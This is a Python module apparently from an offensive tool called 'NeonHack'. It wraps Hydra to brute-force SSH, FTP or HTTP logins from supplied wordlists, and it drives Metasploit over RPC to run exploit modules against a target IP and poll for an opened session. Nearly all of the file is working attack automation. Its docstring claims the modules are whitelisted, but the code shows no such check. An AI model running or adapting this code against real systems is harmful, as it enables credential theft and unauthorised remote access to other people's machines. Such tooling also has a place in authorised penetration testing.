"""
Refactored Scanner Tools Library for NeonHack (v5.0 - Hardened)

This module contains all non-privileged scanning and attack logic.
It provides secure wrappers for command-line tools and external services.
"""
import logging
import subprocess
import tempfile
import os
import socket
import json
from pymetasploit3.msfrpc import MsfRpcClient

logging.basicConfig(level=logging.INFO, format='%(asctime)s [%(levelname)s] - %(message)s')

def secure_delete(filepath):
    """Securely deletes a file by overwriting its content first."""
    if filepath and os.path.exists(filepath):
        try:
            with open(filepath, "ba+") as f:
                length = f.tell()
                f.seek(0)
                f.write(os.urandom(length))
            os.remove(filepath)
        except Exception as e:
            logging.error(f"Failed to securely delete temp file {filepath}: {e}")

def test_connectivity(ip: str, protocol: str):
    """Performs a simple TCP connection test with a 3-second timeout."""
    PORT_MAP = {'ssh': 22, 'ftp': 21, 'http': 80}
    port = PORT_MAP.get(protocol.lower())
    if not port:
        return {"status": "error", "message": f"Unsupported protocol: {protocol}"}
    try:
        with socket.create_connection((ip, port), timeout=3) as s:
            return {"status": "success", "message": f"Connected to {ip} on port {port} ({protocol})."}
    except socket.timeout:
        return {"status": "error", "message": f"Connection to {ip} on port {port} timed out."}
    except Exception as e:
        return {"status": "error", "message": f"Failed to connect to {ip} on port {port}: {e}"}

def hydra_attack(ip, protocol, username_wordlist, password_wordlist, timeout=300):
    """Performs a Hydra attack and returns a structured dictionary."""
    user_file_path, pass_file_path = None, None
    try:
        with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt') as user_file, \
             tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.txt') as pass_file:
            user_file.write(username_wordlist)
            user_file_path = user_file.name
            pass_file.write(password_wordlist)
            pass_file_path = pass_file.name
        
        command = ['hydra', '-L', user_file_path, '-P', pass_file_path, f'{protocol}://{ip}']
        logging.info(f"Executing command with {timeout}s timeout: {' '.join(command)}")
        
        result = subprocess.run(
            command, capture_output=True, text=True, check=False, timeout=timeout
        )
        
        if result.stderr:
            return {"status": "error", "message": f"Hydra Error: {result.stderr}"}
        elif result.stdout:
            return {"status": "success", "data": result.stdout}
        else:
            return {"status": "success", "data": "Hydra ran successfully but found no credentials."}
            
    except FileNotFoundError:
        return {"status": "error", "message": "Error: 'hydra' command not found. Please ensure it is installed."}
    except subprocess.TimeoutExpired:
        return {"status": "error", "message": f"Error: Hydra process timed out after {timeout} seconds."}
    except Exception as e:
        return {"status": "error", "message": f"An unexpected error occurred: {e}"}
    finally:
        secure_delete(user_file_path)
        secure_delete(pass_file_path)

def execute_exploit(ip, module_name, msf_password, timeout=60):
    """Connects to Metasploit RPC and executes a whitelisted module."""
    try:
        # Try to connect to Metasploit RPC
        try:
            client = MsfRpcClient(msf_password, ssl=False, port=55553)
        except ConnectionRefusedError:
            # Try alternative port
            try:
                client = MsfRpcClient(msf_password, ssl=False, port=55552)
            except ConnectionRefusedError:
                return {
                    "status": "error", 
                    "message": "Failed to connect to msfrpcd. Please ensure msfrpcd is running on localhost:55553 or localhost:55552"
                }
        
        if not client.authenticated:
            return {
                "status": "error", 
                "message": "Authentication to Metasploit RPC failed. Check MSF_PASSWORD environment variable."
            }

        # Parse and load the module
        try:
            module_type, module_path = module_name.split('/', 1)
            exploit = client.modules.use(module_type, module_path)
            if not exploit:
                return {
                    "status": "error", 
                    "message": f"Failed to load module {module_name}. Module may not exist or be whitelisted."
                }
        except ValueError:
            return {
                "status": "error", 
                "message": f"Invalid module name format: {module_name}. Expected format: type/path"
            }

        # Configure and execute the module
        exploit['RHOSTS'] = ip
        logging.info(f"Executing module {exploit.fullname} on {ip}...")
        
        try:
            job_info = exploit.execute()
        except Exception as e:
            return {
                "status": "error", 
                "message": f"Failed to execute module: {e}"
            }

        job_id = job_info.get('job_id')
        if job_id is None:
            return {
                "status": "error", 
                "message": "Failed to start exploit job",
                "details": job_info
            }
            
        logging.info(f"Exploit started as job ID: {job_id}. Polling for session...")
        
        # Poll for sessions
        import time
        for _ in range(timeout):
            try:
                sessions = client.sessions.list
                for session_id, session_data in sessions.items():
                    if (session_data.get('via_exploit') == exploit.fullname and 
                        session_data.get('session_host') == ip):
                        logging.info(f"SUCCESS! Session {session_id} opened.")
                        return {
                            "status": "success", 
                            "session_id": session_id, 
                            "details": session_data
                        }
                time.sleep(1)
            except Exception as e:
                logging.warning(f"Error while polling for sessions: {e}")
                break
        
        return {
            "status": "timeout", 
            "message": f"Exploit job started, but no session was created within {timeout} seconds."
        }
        
    except ImportError:
        return {
            "status": "error", 
            "message": "pymetasploit3 library not available. Please install it with: pip install pymetasploit3"
        }
    except Exception as e:
        logging.error(f"Metasploit integration error: {e}")
        return {
            "status": "error", 
            "message": f"Unexpected error: {e}"
        }